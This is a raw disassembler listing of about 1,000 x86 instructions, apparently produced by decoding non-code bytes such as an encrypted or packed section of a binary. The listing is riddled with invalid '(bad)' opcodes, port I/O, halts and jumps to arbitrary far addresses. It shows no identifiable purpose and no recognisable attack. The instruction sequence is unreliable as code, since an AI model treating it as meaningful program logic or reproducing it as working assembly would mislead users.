  413ee7:	sub    eax,0xb088259b
  413eec:	push   ebp
  413eed:	pop    ebx
  413eee:	out    dx,eax
  413eef:	repnz aaa 
  413ef1:	sbb    DWORD PTR [eax],edx
  413ef3:	mov    edx,0xb7050671
  413ef8:	pushw  ds
  413efa:	pop    esp
  413efb:	lock nop
  413efd:	push   ss
  413efe:	pushf  
  413eff:	imul   edx,esp,0xe
  413f02:	add    al,0x53
  413f04:	(bad)  
  413f05:	clc    
  413f06:	jnp    0x413f42
  413f08:	mov    bl,0xc7
  413f0a:	ret    
  413f0b:	loop   0x413eec
  413f0d:	cdq    
  413f0e:	nop
  413f0f:	adc    dl,0x35
  413f12:	sti    
  413f13:	inc    edx
  413f14:	loopne 0x413f8d
  413f16:	add    BYTE PTR [ebp-0x4b],0x78
  413f1a:	mov    cl,0xe5
  413f1c:	and    BYTE PTR [esi],ah
  413f1e:	addr16 daa 
  413f20:	test   DWORD PTR [edi],ebp
  413f22:	fsub   DWORD PTR [edx+0x75]
  413f25:	push   ebx
  413f26:	(bad)  
  413f28:	xchg   esi,eax
  413f29:	pop    ebp
  413f2a:	(bad)  
  413f2b:	addr16 cld 
  413f2d:	xchg   BYTE PTR [ebx-0x72],ah
  413f30:	sub    ah,ah
  413f32:	out    0x1f,al
  413f34:	adc    eax,DWORD PTR [ebx+eiz*1-0x7d2ae2d2]
  413f3b:	fst    DWORD PTR [ecx+0x60]
  413f3e:	sar    DWORD PTR [eax],cl
  413f40:	les    esp,FWORD PTR [edi]
  413f42:	and    esi,ebp
  413f44:	push   ebp
  413f45:	jne    0x413f76
  413f47:	add    ah,BYTE PTR [ebx]
  413f49:	popa   
  413f4a:	es push ebp
  413f4c:	xlat   BYTE PTR ds:[ebx]
  413f4d:	sbb    dh,ah
  413f4f:	dec    esi
  413f50:	in     eax,0x2c
  413f52:	repnz test eax,0x4b154f61
  413f58:	mov    ds:0x1616480e,eax
  413f5d:	add    ebp,DWORD PTR [ebp+0x16]
  413f60:	pop    ebp
  413f61:	and    cl,al
  413f63:	lahf   
  413f64:	bound  edi,QWORD PTR [ecx-0x7ebb7cb5]
  413f6a:	push   DWORD PTR [esi+ebx*4]
  413f6d:	outs   dx,BYTE PTR ds:[esi]
  413f6e:	and    DWORD PTR [esi+0x13],ebp
  413f71:	cmp    al,0x60
  413f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f74:	call   0xba64:0xf724026e
  413f7b:	imul   eax,ebp,0x24
  413f7e:	mov    eax,0x41be25c7
  413f83:	mov    cl,0xd2
  413f85:	gs retf 
  413f87:	adc    edx,ebp
  413f89:	push   0x64
  413f8b:	push   0xa842b105
  413f90:	sahf   
  413f91:	fsub   QWORD PTR [ebp-0x26]
  413f94:	rcr    BYTE PTR [ebx+esi*4+0x22226b7],cl
  413f9b:	xchg   edi,eax
  413f9c:	or     eax,0x1561725f
  413fa1:	lock push es
  413fa3:	nop
  413fa4:	call   0xcbf7d814
  413fa9:	out    0x9,eax
  413fab:	jne    0x414018
  413fad:	jne    0x413fd4
  413faf:	iret   
  413fb0:	add    al,0xcd
  413fb2:	inc    esp
  413fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fb4:	fimul  DWORD PTR [edx-0x4a]
  413fb7:	and    BYTE PTR [edx],cl
  413fb9:	jle    0x413f87
  413fbb:	jle    0x414018
  413fbd:	test   al,0x9c
  413fbf:	xor    eax,0x38aed2b0
  413fc4:	nop
  413fc5:	sub    edx,eax
  413fc7:	or     ebp,DWORD PTR [ebp+0x3a]
  413fca:	aaa    
  413fcb:	xor    al,0xb0
  413fcd:	mov    edx,es
  413fcf:	add    BYTE PTR [esi-0x6cfaaf64],dl
  413fd5:	mov    BYTE PTR [edx-0x2f],0x4
  413fd9:	sbb    BYTE PTR [ebx],bh
  413fdb:	jg     0x413fd0
  413fdd:	sbb    DWORD PTR [ebx+0x45],0x56
  413fe1:	mov    esp,0xb223c4dc
  413fe6:	pop    edx
  413fe7:	dec    edx
  413fe8:	ret    0x89a
  413feb:	mov    ds:0x1ffe6ff7,eax
  413ff0:	test   ecx,edx
  413ff2:	xchg   esi,eax
  413ff3:	jmp    0x62ea:0x197c65f9
  413ffa:	ds dec edx
  413ffc:	cs call 0x1ccf:0xd91371fb
  414004:	cwde   
  414005:	sub    eax,0x36428872
  41400a:	aaa    
  41400b:	test   al,0x7c
  41400d:	or     ecx,eax
  41400f:	mov    bh,0x51
  414011:	adc    DWORD PTR [esi-0x1d],ebp
  414014:	ja     0x414077
  414016:	gs pop ecx
  414018:	je     0x41405c
  41401a:	mov    cl,0x5
  41401c:	xor    ecx,DWORD PTR [edx]
  41401e:	xor    ch,BYTE PTR [ecx]
  414020:	fdiv   QWORD PTR [ecx-0x12692090]
  414026:	hlt    
  414027:	and    ah,dl
  414029:	or     eax,0x5ac8bdb6
  41402e:	push   esi
  41402f:	stos   DWORD PTR es:[edi],eax
  414030:	out    0x29,eax
  414032:	and    eax,esp
  414034:	push   ecx
  414035:	call   0xd3f:0xeb97083d
  41403c:	cmp    ecx,esi
  41403e:	sbb    BYTE PTR [ebp+0x62],0x7c
  414042:	pop    esi
  414043:	call   0x7dcc45
  414048:	mov    dl,0x5e
  41404a:	xchg   edi,eax
  41404b:	arpl   WORD PTR ds:[esi],di
  41404e:	and    al,0x7c
  414050:	mov    ch,0xa9
  414052:	adc    al,0x5f
  414054:	test   dh,bl
  414056:	or     eax,0xfedc13dc
  41405b:	mov    ah,0xee
  41405d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41405e:	mov    esp,0xba63b905
  414063:	jo     0x414022
  414065:	std    
  414066:	sahf   
  414067:	scas   al,BYTE PTR es:[edi]
  414068:	push   0x16802de5
  41406d:	xor    edx,ecx
  41406f:	sub    eax,0x91ee0896
  414074:	ins    BYTE PTR es:[edi],dx
  414075:	icebp  
  414076:	sahf   
  414077:	aam    0x7
  414079:	mov    edx,0x3e3fbd13
  41407e:	or     DWORD PTR ss:[ebx-0x2eece814],ebx
  414085:	out    0x90,al
  414087:	loope  0x41407e
  414089:	xchg   edi,eax
  41408a:	pusha  
  41408b:	jns    0x4140f4
  41408d:	and    DWORD PTR [edx-0x4],ecx
  414090:	pop    edi
  414091:	add    eax,0x90891208
  414096:	(bad)  
  414097:	sbb    al,0x81
  414099:	and    esi,DWORD PTR [ebp+0x49196250]
  41409f:	push   0x39
  4140a1:	lea    ebp,[esp+eax*2-0x5204177c]
  4140a8:	pop    eax
  4140a9:	int    0x88
  4140ab:	retf   0x6a7f
  4140ae:	dec    edx
  4140af:	sar    DWORD PTR [ebx+eax*4-0x59],1
  4140b3:	out    dx,eax
  4140b4:	pop    eax
  4140b5:	inc    esi
  4140b6:	mov    ch,0x19
  4140b8:	sbb    bh,BYTE PTR [ebx]
  4140ba:	xlat   BYTE PTR ds:[ebx]
  4140bb:	(bad)  
  4140bc:	pop    edx
  4140bd:	mov    edx,0x2f0986fa
  4140c2:	in     al,dx
  4140c3:	mov    ebx,0x4653a0bb
  4140c8:	push   ebp
  4140c9:	jmp    0x414106
  4140cb:	lea    edi,[eax+0x54b031dd]
  4140d1:	in     al,dx
  4140d2:	dec    ebx
  4140d3:	jmp    0x414151
  4140d5:	fsubr  DWORD PTR [edx-0x5ed1d537]
  4140db:	cld    
  4140dc:	cli    
  4140dd:	popa   
  4140de:	jmp    0x2aa5:0x61101742
  4140e5:	cmp    ch,dh
  4140e7:	push   ds
  4140e8:	and    ebx,DWORD PTR [eax+0x5364ce2b]
  4140ee:	ror    BYTE PTR [ebp+0x55090515],cl
  4140f4:	xor    ah,BYTE PTR [ebp-0x6dac4309]
  4140fa:	into   
  4140fb:	xchg   DWORD PTR [eax-0x3e],esi
  4140fe:	pusha  
  4140ff:	lods   al,BYTE PTR ds:[esi]
  414100:	imul   ebx,ebx,0xb5bd9059
  414106:	fadd   DWORD PTR [eax+ebp*8]
  414109:	cli    
  41410a:	jmp    0x5e59d6c3
  41410f:	outs   dx,BYTE PTR ds:[esi]
  414110:	cdq    
  414111:	pusha  
  414112:	pop    edi
  414113:	inc    eax
  414114:	inc    ecx
  414115:	inc    ecx
  414116:	cdq    
  414117:	cld    
  414118:	stos   BYTE PTR es:[edi],al
  414119:	jnp    0x41409b
  41411b:	mov    bh,0x2a
  41411d:	pop    esp
  41411e:	adc    eax,DWORD PTR [eax]
  414120:	jl     0x4140b0
  414122:	sbb    BYTE PTR [edi+0x796e7660],0xf7
  414129:	popf   
  41412a:	aaa    
  41412b:	push   0xd8b20d55
  414130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414131:	adc    al,0x10
  414133:	fisubr DWORD PTR [edi-0x6da58f99]
  414139:	enter  0x6945,0xfd
  41413d:	jmp    0x12b342fe
  414142:	adc    al,0x3b
  414144:	push   cs
  414145:	add    BYTE PTR [edx-0x51],ch
  414148:	pop    ss
  414149:	sbb    eax,0x82eedb02
  41414e:	lea    edx,[edx]
  414150:	arpl   WORD PTR ds:0x13e061ae,cx
  414156:	retf   
  414157:	cmp    al,dl
  414159:	nop
  41415a:	cmp    BYTE PTR [esi],ah
  41415c:	shl    ebp,1
  41415e:	imul   ebx,ecx,0x4496feda
  414164:	sbb    eax,0x45c35bc5
  414169:	mov    eax,0x7ee273b
  41416e:	pop    ebp
  41416f:	and    eax,0x97fa06e5
  414174:	mov    bh,0xed
  414176:	add    edi,DWORD PTR [edi+0x17]
  414179:	(bad)  
  41417a:	xor    ch,BYTE PTR [esi-0x54]
  41417d:	int    0x6b
  41417f:	mov    DWORD PTR [ebx-0x74],esp
  414182:	in     al,dx
  414183:	inc    ebx
  414184:	ins    DWORD PTR es:[edi],dx
  414185:	inc    edx
  414186:	outs   dx,BYTE PTR ds:[esi]
  414187:	inc    eax
  414188:	imul   esp,DWORD PTR ss:[ebx-0x17bd98e7],0x63
  414190:	push   esp
  414191:	ins    BYTE PTR es:[edi],dx
  414192:	test   DWORD PTR [eax+esi*8],0x2b63bdb1
  414199:	jns    0x414181
  41419b:	cmp    DWORD PTR [eax],ecx
  41419d:	scas   al,BYTE PTR es:[edi]
  41419e:	ins    BYTE PTR es:[edi],dx
  41419f:	sbb    al,0x84
  4141a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141a2:	mov    al,0xcd
  4141a4:	push   0x9c8fce70
  4141a9:	iret   
  4141aa:	pop    es
  4141ab:	fsub   QWORD PTR [eax-0x46b338a9]
  4141b1:	push   ds
  4141b2:	xor    BYTE PTR [esi-0x1ea75749],bh
  4141b8:	sub    BYTE PTR [eax],ah
  4141ba:	inc    ebp
  4141bb:	or     BYTE PTR [eax-0x1e],dh
  4141be:	(bad)  
  4141bf:	int3   
  4141c0:	adc    al,al
  4141c2:	inc    eax
  4141c3:	in     al,dx
  4141c4:	inc    ebp
  4141c5:	lods   eax,DWORD PTR ds:[esi]
  4141c6:	sub    esp,ecx
  4141c8:	mov    dh,0x55
  4141ca:	jmp    0x5d1e:0x10d7c354
  4141d1:	mov    bh,0x3c
  4141d3:	adc    edi,DWORD PTR [ebx]
  4141d5:	(bad)  
  4141d7:	fadd   QWORD PTR [eax]
  4141d9:	sbb    dl,al
  4141db:	adc    al,0xed
  4141dd:	stos   DWORD PTR es:[edi],eax
  4141de:	fadd   st(3),st
  4141e0:	sbb    BYTE PTR [ebp+0x5edfc0a8],ah
  4141e6:	mov    ebp,0x30216420
  4141eb:	pop    edi
  4141ec:	lods   eax,DWORD PTR ds:[esi]
  4141ed:	jno    0x414188
  4141ef:	sub    eax,0xb5403ce1
  4141f4:	or     DWORD PTR [eax],eax
  4141f6:	sti    
  4141f7:	or     bl,0x65
  4141fa:	xor    bh,BYTE PTR [edx+edx*4]
  4141fd:	mov    WORD PTR [ebx+ecx*1+0x38],ss
  414201:	(bad)  
  414202:	mov    al,ds:0x33cde768
  414207:	jne    0x41421a
  414209:	push   esp
  41420a:	sbb    ch,BYTE PTR ds:0xec5a46e4
  414210:	dec    eax
  414211:	jmp    0x951742ec
  414216:	mov    ds:0x3cbd6cde,al
  41421b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41421d:	lds    ecx,FWORD PTR [ecx-0x77]
  414220:	lods   eax,DWORD PTR ds:[esi]
  414221:	jecxz  0x4141cd
  414223:	pusha  
  414224:	lock sbb al,0x8
  414227:	lahf   
  414228:	cmp    al,0x4d
  41422a:	mov    ebx,0x27ab4758
  41422f:	or     eax,0xdfa1599f
  414234:	xchg   edi,eax
  414235:	imul   esi,DWORD PTR [eax+0x51094f6c],0xffffffac
  41423c:	adc    ebx,edi
  41423e:	cmp    ch,BYTE PTR [edi+0x581a6b75]
  414244:	das    
  414245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414246:	imul   ebx,DWORD PTR [ebx-0x2f],0xd6110e52
  41424d:	adc    al,0x92
  41424f:	mov    ebx,0x538ee36e
  414254:	xchg   edi,eax
  414255:	std    
  414256:	hlt    
  414257:	stos   BYTE PTR es:[edi],al
  414258:	add    cl,dh
  41425a:	mov    ch,0xa3
  41425c:	in     al,0x1d
  41425e:	mov    ds:0x3321503c,al
  414263:	jl     0x414255
  414265:	les    ebx,FWORD PTR [edi+eiz*1]
  414268:	rcl    BYTE PTR [ebx-0x79aa556b],cl
  41426e:	xor    DWORD PTR [eax+0x4ef2f2f2],eax
  414274:	jnp    0x4142b5
  414276:	cdq    
  414277:	sti    
  414278:	leave  
  414279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41427a:	aam    0xa9
  41427c:	imul   ebp,DWORD PTR [edi+0x76986f52],0xfacdcb48
  414286:	cwde   
  414287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414288:	mov    edx,0x5d5b387
  41428d:	pop    es
  41428e:	jo     0x414296
  414290:	xchg   ebp,eax
  414291:	aaa    
  414292:	ror    BYTE PTR [edx],1
  414294:	(bad)  
  414295:	into   
  414296:	aam    0xaf
  414298:	adc    DWORD PTR [ebx+0x2987f7a4],esp
  41429e:	mov    ds:0xff03c30,eax
  4142a3:	or     esi,edx
  4142a5:	dec    ebx
  4142a6:	test   DWORD PTR ds:0xa4e653af,esp
  4142ac:	add    esp,eax
  4142ae:	or     al,0x5b
  4142b0:	mov    al,ds:0xe574bd
  4142b5:	(bad)  
  4142b7:	mov    ch,0xee
  4142b9:	popa   
  4142ba:	cmp    al,0xe9
  4142bc:	(bad)  
  4142bd:	stc    
  4142be:	lds    ecx,FWORD PTR [ebp-0x9]
  4142c1:	push   edi
  4142c2:	cmp    bh,bh
  4142c4:	push   ss
  4142c5:	mov    eax,ds:0x180e019e
  4142ca:	jmp    0xe0329747
  4142cf:	fisttp WORD PTR [ebx+0x4f569748]
  4142d5:	test   al,0x3d
  4142d7:	xor    esp,DWORD PTR [edi-0x39]
  4142da:	ins    BYTE PTR es:[edi],dx
  4142db:	or     al,0xc0
  4142dd:	push   edi
  4142de:	xchg   esi,eax
  4142df:	jg     0x41426d
  4142e1:	vdivsd xmm6,xmm7,xmm4
  4142e5:	inc    ebx
  4142e6:	sbb    eax,0xf316bca
  4142eb:	cmp    cl,BYTE PTR ds:0x66ccf17c
  4142f1:	ins    DWORD PTR es:[edi],dx
  4142f2:	adc    DWORD PTR [ecx+0x69ba6110],ebx
  4142f8:	mov    bl,0xb3
  4142fa:	adc    eax,0x96403b79
  4142ff:	rol    edi,cl
  414301:	sbb    al,0x22
  414303:	cld    
  414304:	adc    BYTE PTR [ebp-0x2b585267],0x38
  41430b:	aam    0xc6
  41430d:	in     eax,0x3c
  41430f:	sub    al,0xad
  414311:	mov    ecx,0xe7326731
  414316:	repz xchg edi,eax
  414318:	sub    edi,DWORD PTR [esi]
  41431a:	inc    esp
  41431b:	jo     0x414388
  41431d:	mov    esi,0x69bcbffa
  414322:	xchg   esi,eax
  414323:	ret    0x254e
  414326:	and    bl,bl
  414328:	fidivr DWORD PTR [edi+0x43d40345]
  41432e:	inc    ecx
  41432f:	cmp    BYTE PTR [edi+edx*1-0x68],bl
  414333:	mov    ds:0x250c8f8e,eax
  414338:	adc    ebp,DWORD PTR [ecx]
  41433a:	fwait
  41433b:	scas   eax,DWORD PTR es:[edi]
  41433c:	arpl   WORD PTR [ebp+eax*8+0x7],sp
  414340:	jecxz  0x4142cc
  414342:	mov    esi,0xdb7e35d3
  414347:	xor    DWORD PTR [esi-0x5f4b60cf],eax
  41434d:	shl    DWORD PTR [ecx+0x31],0xc9
  414351:	jge    0x414344
  414353:	push   es
  414354:	call   FWORD PTR ds:0x76a81ed7
  41435a:	inc    esp
  41435b:	or     eax,0x13ce6b56
  414360:	xor    dl,dh
  414362:	cmp    eax,ebx
  414364:	push   edx
  414365:	lods   al,BYTE PTR ds:[esi]
  414366:	and    BYTE PTR [ebp+esi*4-0x75a72454],ah
  41436d:	mov    dl,0x81
  41436f:	sbb    edi,ebp
  414371:	pop    es
  414372:	sbb    al,0x3
  414374:	jns    0x4143c4
  414376:	(bad)  
  414377:	xlat   BYTE PTR ds:[ebx]
  414378:	iret   
  414379:	xor    dx,WORD PTR [edx+0x39428574]
  414380:	add    bh,BYTE PTR [ebp-0x3d116519]
  414386:	pop    ecx
  414387:	in     eax,0x6d
  414389:	mov    eax,0xbb3da867
  41438e:	jecxz  0x4143ca
  414390:	xchg   BYTE PTR [ecx+0x5b],bh
  414393:	inc    ecx
  414394:	stc    
  414395:	pop    edi
  414396:	and    BYTE PTR ds:0xb1dea3a1,0xf
  41439d:	cmc    
  41439e:	nop
  41439f:	add    eax,0xc423fd24
  4143a4:	aad    0x69
  4143a6:	out    0xd1,eax
  4143a8:	lods   eax,DWORD PTR ds:[esi]
  4143a9:	dec    esp
  4143aa:	adc    BYTE PTR [ebx+eax*4+0x79e21a0a],ch
  4143b1:	(bad)  
  4143b3:	aaa    
  4143b4:	mov    dl,0x4e
  4143b6:	jecxz  0x414356
  4143b8:	and    eax,0x82fc8488
  4143bd:	clc    
  4143be:	add    eax,0xe23e1c64
  4143c3:	(bad)  
  4143c4:	repz xchg edi,eax
  4143c6:	push   ss
  4143c7:	or     BYTE PTR [ebx+0x8e2f8b],dl
  4143cd:	in     eax,dx
  4143ce:	scas   al,BYTE PTR es:[edi]
  4143cf:	shl    ebx,1
  4143d1:	jecxz  0x414425
  4143d3:	add    esi,eax
  4143d5:	push   cs
  4143d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143d7:	pop    esp
  4143d8:	cmp    eax,0x71b59449
  4143dd:	ror    DWORD PTR [ebp+edi*1+0x2c312fe0],cl
  4143e4:	(bad)  
  4143e5:	std    
  4143e6:	mov    esp,0xf5bc2394
  4143eb:	mov    edi,0xff0e5a34
  4143f0:	outs   dx,DWORD PTR ds:[esi]
  4143f1:	sbb    al,0xcb
  4143f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f4:	inc    edx
  4143f5:	push   ss
  4143f6:	repnz (bad) 
  4143f8:	jns    0x4143b9
  4143fa:	xor    eax,0x563acee5
  4143ff:	add    al,0xbd
  414401:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  414403:	ficomp WORD PTR [edi+0x17dba773]
  414409:	ins    DWORD PTR es:[edi],dx
  41440a:	mov    ds:0x7b7a28a3,al
  41440f:	arpl   WORD PTR [esp+ebp*4],sp
  414412:	mov    ecx,0x60f3a7f7
  414417:	add    eax,DWORD PTR [edi-0x147aab2b]
  41441d:	(bad)  
  41441e:	(bad)  
  41441f:	lahf   
  414420:	sbb    al,0x8a
  414422:	cwde   
  414423:	mov    ds,WORD PTR [ecx]
  414425:	outs   dx,BYTE PTR ds:[esi]
  414426:	aam    0xbf
  414428:	repz or al,0x18
  41442b:	adc    BYTE PTR [edi-0x61],dh
  41442e:	idiv   bl
  414430:	pop    esi
  414431:	aaa    
  414432:	lock push 0x9d100c6a
  414438:	jae    0x41442c
  41443a:	dec    eax
  41443b:	dec    ebx
  41443c:	dec    ecx
  41443d:	test   BYTE PTR ds:0xd377cddf,0xe3
  414444:	adc    DWORD PTR [esi+eax*2],esi
  414447:	loope  0x4144c8
  414449:	mov    ecx,ebx
  41444b:	mov    dl,0x9
  41444d:	mov    dh,ah
  41444f:	cmp    ebx,DWORD PTR [esi+0x60]
  414452:	mul    edi
  414454:	lahf   
  414455:	lods   al,BYTE PTR ds:[esi]
  414456:	into   
  414457:	sub    al,0x63
  414459:	shr    BYTE PTR [ebp-0x4804114c],0x76
  414460:	push   ecx
  414461:	lahf   
  414462:	es clc 
  414464:	nop
  414465:	ins    BYTE PTR es:[edi],dx
  414466:	test   al,0xa0
  414468:	cmc    
  414469:	repz sbb al,0x96
  41446c:	sub    BYTE PTR [ebp+esi*2+0x1e],ch
  414470:	jb     0x414424
  414472:	inc    esp
  414473:	scas   eax,DWORD PTR es:[edi]
  414474:	jne    0x4144d8
  414476:	push   ss
  414477:	or     al,ah
  414479:	mov    ebp,edi
  41447b:	(bad)  
  41447c:	xchg   esp,eax
  41447d:	les    ebp,FWORD PTR [ecx]
  41447f:	push   edi
  414480:	add    al,0xae
  414482:	push   esp
  414483:	outs   dx,BYTE PTR ds:[si]
  414485:	push   es
  414486:	xor    eax,0x1dd5ba5d
  41448b:	mov    DWORD PTR [edx+0x6d],esi
  41448e:	or     bl,BYTE PTR [edx+0x73]
  414491:	jle    0x414413
  414493:	cmc    
  414494:	sbb    al,0xb6
  414496:	xor    bh,BYTE PTR [ebx+0x59ed1ff9]
  41449c:	pop    es
  41449d:	push   es
  41449e:	loopne 0x414518
  4144a0:	cmovo  edi,DWORD PTR [edx+0x29]
  4144a4:	shr    DWORD PTR [ebp+0x4b],1
  4144a7:	push   edi
  4144a8:	push   ds
  4144a9:	cmc    
  4144aa:	dec    ebp
  4144ab:	push   edx
  4144ac:	jmp    0xf46d74b7
  4144b1:	cmc    
  4144b2:	and    DWORD PTR [edx-0x2bbe3736],esp
  4144b8:	shl    dh,0x10
  4144bb:	pop    esp
  4144bc:	cs jecxz 0x414520
  4144bf:	cmc    
  4144c0:	shl    BYTE PTR [edx-0x2371c8d0],0xbb
  4144c7:	dec    edi
  4144c8:	cmp    cl,dl
  4144ca:	sub    al,0x45
  4144cc:	popa   
  4144cd:	rol    BYTE PTR [ecx+0x7f],cl
  4144d0:	outs   dx,DWORD PTR ds:[esi]
  4144d1:	out    dx,eax
  4144d2:	dec    edi
  4144d3:	ret    
  4144d4:	sub    DWORD PTR [esi],edi
  4144d6:	adc    al,0xd3
  4144d8:	sbb    al,0xcd
  4144da:	out    0xcc,al
  4144dc:	ds mov ah,0xf3
  4144df:	push   edx
  4144e0:	ret    
  4144e1:	imul   esp,DWORD PTR [edx],0x8e3dee
  4144e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144e8:	dec    ebx
  4144e9:	in     eax,0xbb
  4144eb:	inc    esi
  4144ec:	(bad)  
  4144ed:	ss fcompp 
  4144f0:	mov    DWORD PTR [eax-0x588e7e],edx
  4144f6:	jg     0x4144b0
  4144f8:	xor    al,0x42
  4144fa:	in     eax,0x57
  4144fc:	ffree  st(1)
  4144fe:	cmp    dl,al
  414500:	iret   
  414501:	(bad)  
  414502:	cmp    dl,dl
  414504:	iret   
  414505:	or     BYTE PTR [ebx+0x41cfe2df],ah
  41450b:	pop    esp
  41450c:	bound  esi,QWORD PTR [esi+0x2f]
  41450f:	aaa    
  414510:	hlt    
  414511:	lods   al,BYTE PTR ds:[esi]
  414512:	xchg   ecx,eax
  414513:	aaa    
  414514:	jo     0x4144b8
  414516:	call   0xa9d8:0x4fc51a73
  41451d:	mov    WORD PTR gs:[ebx-0xad89d13],ss
  414524:	adc    esp,ecx
  414526:	vpsraw xmm5,xmm1,XMMWORD PTR [eax]
  41452a:	(bad)  
  41452b:	dec    esp
  41452c:	jno    0x414532
  41452e:	std    
  41452f:	(bad)  
  414530:	das    
  414531:	jp     0x4144d5
  414533:	push   eax
  414534:	sub    DWORD PTR [esp+edx*2],0x20
  414538:	inc    eax
  414539:	mov    ?,WORD PTR [ebx]
  41453b:	pop    esi
  41453c:	loope  0x41454e
  41453e:	int3   
  41453f:	sti    
  414540:	mov    edi,0xb0d19317
  414545:	int3   
  414546:	cmp    BYTE PTR [ebp-0xb783d22],al
  41454c:	cdq    
  41454d:	aad    0x5d
  41454f:	cmp    DWORD PTR [edx+0x39387b07],0xffffffe4
  414556:	jnp    0x4145d1
  414558:	xchg   ebp,eax
  414559:	add    eax,0xe237d8d6
  41455e:	mov    cl,cl
  414560:	test   eax,0xb69d78d5
  414565:	(bad)  
  414566:	div    DWORD PTR [edi]
  414568:	cmp    ecx,DWORD PTR [edx-0x1414c339]
  41456e:	(bad)  
  41456f:	daa    
  414570:	neg    BYTE PTR [edi+ebp*2-0x2f]
  414574:	leave  
  414575:	cmp    eax,DWORD PTR [esi-0x6a]
  414578:	inc    ebx
  414579:	aam    0x96
  41457b:	or     BYTE PTR [ebx],bl
  41457d:	push   cs
  41457e:	xchg   esi,eax
  41457f:	out    0x5,eax
  414581:	(bad)  
  414582:	adc    al,BYTE PTR [edi]
  414584:	in     al,dx
  414585:	shr    BYTE PTR [edx+0x56],1
  414588:	cli    
  414589:	outs   dx,DWORD PTR ds:[esi]
  41458a:	cmp    al,0xa6
  41458c:	std    
  41458d:	test   BYTE PTR [eax-0x20a3bf20],0x4c
  414594:	pop    ds
  414595:	in     eax,0xe1
  414597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414598:	out    0xa2,al
  41459a:	xchg   DWORD PTR [edi],esi
  41459c:	mov    ebp,0xf51d1783
  4145a1:	mov    al,ds:0x56fb6a2d
  4145a6:	sub    BYTE PTR [eax+0x2c58808c],dl
  4145ac:	shl    BYTE PTR [esi+0x3ef6a4ce],0x33
  4145b3:	and    eax,0x2001fbcf
  4145b8:	mov    eax,0x7d688cec
  4145bd:	dec    ebx
  4145be:	fimul  DWORD PTR [eax]
  4145c0:	test   al,dl
  4145c2:	scas   al,BYTE PTR es:[edi]
  4145c3:	xor    al,0x95
  4145c5:	or     al,dl
  4145c7:	mov    BYTE PTR [edi+ebp*2-0x404bff72],dh
  4145ce:	int3   
  4145cf:	clc    
  4145d0:	push   DWORD PTR [esi+0x50860160]
  4145d6:	or     BYTE PTR [edx],ah
  4145d8:	xor    BYTE PTR [esi+eiz*2-0x31f9a99c],0xa1
  4145e0:	dec    esi
  4145e1:	mov    bh,0xdd
  4145e3:	dec    esi
  4145e4:	and    BYTE PTR [esi+0x56767948],al
  4145ea:	xor    eax,0xcf773e4e
  4145ef:	enter  0xe088,0xf5
  4145f3:	pop    ebx
  4145f4:	push   ds
  4145f5:	or     al,0x30
  4145f7:	inc    DWORD PTR [edi]
  4145f9:	ret    0x3193
  4145fc:	sbb    esi,eax
  4145fe:	dec    ebx
  4145ff:	mov    esp,0x7b72ddcb
  414604:	push   ecx
  414605:	mov    dh,BYTE PTR [eax+0x3a]
  414608:	(bad)  
  414609:	sti    
  41460a:	cwde   
  41460b:	cmp    bh,BYTE PTR [ebx+0x6b]
  41460e:	loope  0x4145b7
  414610:	imul   edx,DWORD PTR [edx-0x33bf513f],0x4da6a390
  41461a:	mov    dl,0x27
  41461c:	jne    0x41466f
  41461e:	sar    DWORD PTR ds:[ebx+0x49b6d226],1
  414625:	popf   
  414626:	test   eax,0x9c86d86a
  41462b:	fptan  
  41462d:	jno    0x414672
  41462f:	pop    esi
  414630:	mov    ebp,0xed279e13
  414635:	jne    0x414664
  414637:	xchg   ecx,eax
  414638:	sbb    eax,0xad489809
  41463d:	cmc    
  41463e:	push   edi
  41463f:	cli    
  414640:	mov    ebx,0x5a60755f
  414645:	rcl    BYTE PTR [edi-0x11441902],cl
  41464b:	rcl    DWORD PTR [edi-0x77],0x7b
  41464f:	xor    BYTE PTR [eax],ch
  414651:	xchg   esp,eax
  414652:	mov    ecx,0xee8f2587
  414657:	stos   DWORD PTR es:[edi],eax
  414658:	and    DWORD PTR [ebx],eax
  41465a:	dec    ebx
  41465b:	pop    esi
  41465c:	enter  0xcc27,0x71
  414660:	(bad)  
  414661:	lock int 0x64
  414664:	jmp    edx
  414666:	(bad)  [ebp+0x7e3d0c1a]
  41466c:	bound  ebx,QWORD PTR [edi+eiz*8+0x4fd5a9d5]
  414673:	call   0x47c9:0xcee163c3
  41467a:	lock aad 0xc4
  41467d:	hlt    
  41467e:	push   esi
  41467f:	shl    DWORD PTR [edi],1
  414681:	mov    dl,0xb4
  414683:	mov    edx,0xaa4a3562
  414688:	fs dec edx
  41468a:	cwde   
  41468b:	(bad)  
  41468c:	(bad)  
  41468d:	aas    
  41468e:	push   edi
  41468f:	nop
  414690:	ins    BYTE PTR es:[edi],dx
  414691:	xchg   edx,eax
  414692:	mov    edi,0x168b4772
  414697:	sbb    al,0x26
  414699:	fld    QWORD PTR [edi-0x2d1974e4]
  41469f:	add    eax,0x5f4870e1
  4146a4:	jl     0x41466a
  4146a6:	mov    edx,0x949a2a9a
  4146ab:	xor    al,0x5a
  4146ad:	clc    
  4146ae:	scas   al,BYTE PTR es:[edi]
  4146af:	xchg   BYTE PTR [esi+0x1c3455c6],ch
  4146b5:	xchg   ecx,eax
  4146b6:	push   ebp
  4146b7:	pop    edi
  4146b8:	xchg   ebx,eax
  4146b9:	test   esi,edi
  4146bb:	imul   eax,DWORD PTR [eax],0xffffffc4
  4146be:	fimul  WORD PTR [ebx+0x2d7df1]
  4146c4:	add    esi,DWORD PTR [ebp-0x7aa31cdf]
  4146ca:	pop    esi
  4146cb:	cmp    al,0x90
  4146cd:	sbb    al,0xda
  4146cf:	mov    al,0x99
  4146d1:	pop    ss
  4146d2:	mov    dl,0x37
  4146d4:	add    ch,al
